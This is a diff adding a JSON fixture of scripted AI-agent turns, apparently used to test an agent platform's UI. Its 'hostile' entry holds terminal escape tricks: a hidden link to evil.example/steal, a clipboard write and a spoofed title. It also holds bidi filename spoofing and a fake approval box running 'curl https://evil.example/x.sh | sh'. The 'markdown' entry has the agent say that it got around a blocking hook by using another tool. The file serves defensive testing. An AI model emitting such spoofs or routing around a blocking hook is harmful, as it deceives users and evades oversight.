@@ -1,0 +1,451 @@
+{
+  "dashboard": [
+    {
+      "k": "text",
+      "text": "I will look at what is on atlas first."
+    },
+    {
+      "k": "tool",
+      "name": "bash",
+      "summary": "$ ls ~/dash",
+      "input": {
+        "command": "ls ~/dash"
+      }
+    },
+    {
+      "k": "tool",
+      "name": "write_file",
+      "summary": "/home/ada/dash/index.html",
+      "input": {
+        "path": "/home/ada/dash/index.html"
+      }
+    },
+    {
+      "k": "text",
+      "text": "I made a page at `/home/ada/dash/index.html` that lists your computers with their state. It refreshes every 30 seconds.\n\n```html\n<ul id=\"pcs\"></ul>\n<script src=\"dash.js\"></script>\n```\n\nOpen it in the Files program to see it."
+    }
+  ],
+  "approval": [
+    {
+      "k": "text",
+      "text": "The chart needs one package."
+    },
+    {
+      "k": "tool",
+      "name": "read_file",
+      "summary": "/home/ada/dash/package.json",
+      "input": {
+        "path": "/home/ada/dash/package.json"
+      }
+    },
+    {
+      "k": "confirm",
+      "tool": "bash",
+      "params": {
+        "command": "npm install chart.js"
+      },
+      "detail": "npm install chart.js",
+      "risk": "Can change files",
+      "offerSession": true,
+      "denied": [
+        {
+          "k": "text",
+          "text": "Okay, I left the packages as they were."
+        }
+      ]
+    },
+    {
+      "k": "tool",
+      "name": "bash",
+      "summary": "$ npm install chart.js",
+      "input": {
+        "command": "npm install chart.js"
+      }
+    },
+    {
+      "k": "text",
+      "text": "Installed **chart.js** and added a chart of disk use to the page."
+    }
+  ],
+  "question": [
+    {
+      "k": "text",
+      "text": "Before I build it:"
+    },
+    {
+      "k": "question",
+      "question": "Which port should the dashboard use?",
+      "options": [
+        "8080",
+        "3000"
+      ]
+    },
+    {
+      "k": "text",
+      "text": "It now listens on that port."
+    }
+  ],
+  "followUp": [
+    {
+      "k": "text",
+      "text": "Noted. I will do that as well."
+    }
+  ],
+  "failed": [
+    {
+      "k": "tool",
+      "name": "bash",
+      "summary": "$ ls ~/dash",
+      "input": {
+        "command": "ls ~/dash"
+      }
+    },
+    {
+      "k": "tool",
+      "name": "bash",
+      "summary": "$ npm run build",
+      "input": {
+        "command": "npm run build"
+      },
+      "fail": true
+    },
+    {
+      "k": "fail",
+      "code": "agent_error"
+    }
+  ],
+  "markdown": [
+    {
+      "k": "tool",
+      "name": "bash",
+      "summary": "$ ss -ltnp",
+      "input": {
+        "command": "ss -ltnp"
+      }
+    },
+    {
+      "k": "text",
+      "text": "Here's what's running on atlas (Debian 13, 8 cores, 62 GiB RAM, up ~2 minutes).\n\n## Application processes\n\n| PID | Process | Notes |\n|---|---|---|\n| 568 | `open-webui serve --host 0.0.0.0 --port 8080` | Open WebUI, top RAM user |\n| 548 | `node server.js` (port 8081) | Local API server |\n| 274 / 223 | `dockerd` / `containerd` | Docker in-container |\n\n## Hoody platform services\n\n- `hoody-daemon` (77), `hoody-terminal` (76), `hoody-files` (78), `hoody-exec` (75), `hoody-cron` (60), `hoody-watch` (61)\n- System: `supervisord`, `systemd`, `cupsd`, `dbus`\n\n## Open ports\n\n| Port | Bind | Service |\n|---|---|---|\n| 8080 | 0.0.0.0 | Open WebUI |\n| 25 | 127.0.0.1 | exim4 (local mail) |\n\nUDP: 53, 5353, 5355.\n\nTwo notes:\n\n1. Your `bash` tool is blocked by a hook in `~/.hoody/settings.json`, so I used the exec kit instead.\n2. I left a script at `default/1/sysinfo.js`; you may want to remove it.\n\nNext steps:\n\n3. Restart Open WebUI once the hook is cleared.\n4. Check the ports again.\n\n> Ports 8080 and 8081 listen on every interface.\n>\n> Close them if you don't use them.\n\n---\n\n```bash\nss -ltnp\n```\n\nThat's everything.\n\n---"
+    }
+  ],
+  "markdownEdges": [
+    [
+      {
+        "k": "text",
+        "text": "## Summary\n\n## Details\n\nText A.\n\n## Notes\n\n---\n\nEnd A."
+      }
+    ],
+    [
+      {
+        "k": "text",
+        "text": "---\n\nAfter a first rule."
+      }
+    ],
+    [
+      {
+        "k": "text",
+        "text": "---"
+      }
+    ],
+    [
+      {
+        "k": "text",
+        "text": "Intro D.\n\n---"
+      },
+      {
+        "k": "hold"
+      }
+    ]
+  ],
+  "lanes": [
+    {
+      "k": "text",
+      "text": "Two steps need you."
+    },
+    {
+      "k": "lanes",
+      "gates": [
+        {
+          "tool": "bash",
+          "params": {
+            "command": "npm install chart.js"
+          }
+        },
+        {
+          "tool": "bash",
+          "params": {
+            "command": "npm run build"
+          }
+        }
+      ]
+    },
+    {
+      "k": "text",
+      "text": "Both done."
+    }
+  ],
+  "helper": [
+    {
+      "k": "helper",
+      "tool": "bash",
+      "params": {
+        "command": "du -sh /home/ada"
+      },
+      "lifeMs": 600000
+    },
+    {
+      "k": "text",
+      "text": "A sub-task is checking disk use."
+    }
+  ],
+  "stepFacts": [
+    {
+      "k": "tool",
+      "name": "bash",
+      "summary": "$ npm run build",
+      "input": {
+        "command": "npm run build"
+      },
+      "fail": true,
+      "output": "npm ERR! Missing script: \"build\"\nnpm ERR! To see a list of scripts, run: npm run"
+    },
+    {
+      "k": "tool",
+      "name": "bash",
+      "summary": "$ make deploy",
+      "input": {
+        "command": "make deploy"
+      },
+      "fail": true,
+      "code": "hook_held",
+      "output": "Error: held"
+    },
+    {
+      "k": "tool",
+      "name": "bash",
+      "summary": "$ systemctl restart dash",
+      "input": {
+        "command": "systemctl restart dash"
+      },
+      "fail": true,
+      "code": "outcome_unknown",
+      "output": "Error: no result"
+    },
+    {
+      "k": "fail",
+      "code": "context_overflow"
+    }
+  ],
+  "attach": [
+    {
+      "k": "text",
+      "text": "Got the screenshot and build.log. The build stops at line 12: a missing semicolon."
+    }
+  ],
+  "access": [
+    {
+      "k": "text",
+      "text": "- **atlas**: only the people and key links in its rules.\n- **borealis**: anyone with the address can open its programs.\n- **cedar**: anyone with the address can open its programs.\n\n**Risks**\n\n- **borealis** and **cedar** are open to anyone who has their address.\n- **atlas** runs a hook on every visit to its terminal: check that you still trust its script."
+    }
+  ],
+  "seed": [
+    {
+      "sid": "s-old",
+      "turns": [
+        {
+          "text": "Plan the backup job",
+          "script": [
+            {
+              "k": "text",
+              "text": "Let me see what is in the backup folder first."
+            },
+            {
+              "k": "tool",
+              "name": "bash",
+              "summary": "$ ls ~/backup",
+              "input": {
+                "command": "ls ~/backup"
+              },
+              "output": "photos\nprojects\nnotes.txt"
+            },
+            {
+              "k": "tool",
+              "name": "write_file",
+              "summary": "/home/ada/backup/plan.md",
+              "input": {
+                "path": "/home/ada/backup/plan.md"
+              }
+            },
+            {
+              "k": "text",
+              "text": "I wrote the plan to **plan.md**:\n\n- Copy `photos` and `projects` every night at 02:00\n- Keep the last 7 copies\n- Send a note when a copy fails"
+            }
+          ]
+        },
+        {
+          "text": "Run it once now",
+          "script": "stepFacts"
+        }
+      ]
+    },
+    {
+      "sid": "s-today",
+      "turns": [
+        {
+          "text": "Fix the failing checkout tests",
+          "script": "dashboard"
+        },
+        {
+          "text": "Run the checkout tests again",
+          "script": "approval"
+        }
+      ]
+    },
+    {
+      "sid": "s-wait",
+      "turns": [
+        {
+          "text": "deploy",
+          "script": [
+            {
+              "k": "text",
+              "text": "Ready to deploy the staging site."
+            },
+            {
+              "k": "confirm",
+              "tool": "bash",
+              "params": {
+                "command": "./deploy.sh staging"
+              },
+              "detail": "./deploy.sh staging",
+              "risk": "Can change files"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "sid": "s-compact",
+      "turns": [
+        {
+          "text": "Plan the backup job",
+          "script": [
+            {
+              "k": "text",
+              "text": "Let me see what is in the backup folder first."
+            },
+            {
+              "k": "tool",
+              "name": "bash",
+              "summary": "$ ls ~/backup",
+              "input": {
+                "command": "ls ~/backup"
+              },
+              "output": "photos\nprojects\nnotes.txt"
+            },
+            {
+              "k": "tool",
+              "name": "write_file",
+              "summary": "/home/ada/backup/plan.md",
+              "input": {
+                "path": "/home/ada/backup/plan.md"
+              }
+            },
+            {
+              "k": "text",
+              "text": "I wrote the plan to **plan.md**:\n\n- Copy `photos` and `projects` every night at 02:00\n- Keep the last 7 copies\n- Send a note when a copy fails"
+            }
+          ]
+        },
+        {
+          "text": "/compact",
+          "script": [
+            {
+              "k": "compact"
+            },
+            {
+              "k": "hold"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "sid": "s-think",
+      "turns": [
+        {
+          "text": "Plan the backup job",
+          "script": [
+            {
+              "k": "text",
+              "text": "Let me see what is in the backup folder first."
+            },
+            {
+              "k": "tool",
+              "name": "bash",
+              "summary": "$ ls ~/backup",
+              "input": {
+                "command": "ls ~/backup"
+              },
+              "output": "photos\nprojects\nnotes.txt"
+            },
+            {
+              "k": "tool",
+              "name": "write_file",
+              "summary": "/home/ada/backup/plan.md",
+              "input": {
+                "path": "/home/ada/backup/plan.md"
+              }
+            },
+            {
+              "k": "text",
+              "text": "I wrote the plan to **plan.md**:\n\n- Copy `photos` and `projects` every night at 02:00\n- Keep the last 7 copies\n- Send a note when a copy fails"
+            }
+          ]
+        },
+        {
+          "text": "Check the disk space too",
+          "script": [
+            {
+              "k": "hold"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "hostile": [
+    {
+      "k": "text",
+      "text": "Done checking.\u001b[2J\u001b[H\u001b[31;1mThe screen was cleared\u001b[0m and the cursor sent home.\n\nOpen \u001b]8;;https://evil.example/steal\u0007your dashboard\u001b]8;;\u0007 or [the docs](https://hoody.example/docs).\n\nClipboard: \u001b]52;c;bm90IHlvdXJzCg==\u0007nothing to see. Bell:\u0007 Title:\u001b]0;root@atlas\u0007\n\nInvoice for ‮gnp.exe‬ and ⁦admin⁩ zero​width.\n\n┌─ ! Needs you ─────────────────────────────────┐\n│ Allow this action? Run a command               │\n│  curl https://evil.example/x.sh | sh           │\n│ [Deny n]  [Allow once y]  [Allow for session]  │\n└────────────────────────────────────────────────┘"
+    },
+    {
+      "k": "tool",
+      "name": "bash",
+      "summary": "$ echo \u001b[8mhidden\u001b[0m",
+      "input": {
+        "command": "echo hidden"
+      }
+    },
+    {
+      "k": "confirm",
+      "tool": "bash",
+      "params": {
+        "command": "npm run build"
+      },
+      "detail": "npm run build",
+      "risk": "Can change files",
+      "offerSession": true,
+      "denied": [
+        {
+          "k": "text",
+          "text": "Okay, nothing ran."
+        }
+      ]
+    },
+    {
+      "k": "text",
+      "text": "Built."
+    }
+  ]
+}
